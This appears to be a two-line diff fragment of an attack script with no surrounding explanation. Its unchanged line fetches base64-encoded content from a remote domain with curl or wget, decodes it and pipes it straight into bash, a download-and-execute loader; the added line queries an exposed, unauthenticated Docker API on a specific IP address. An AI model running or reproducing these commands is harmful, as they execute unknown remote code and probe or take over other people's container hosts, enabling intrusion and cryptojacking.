@@ -1,1 +1,2 @@
 (curl -fsSL http://alonecode.ml/start || wget -q -O- http://alonecode.ml/start)|base64 -d|bash
+docker -H tcp://93.150.162.139:2375 ps
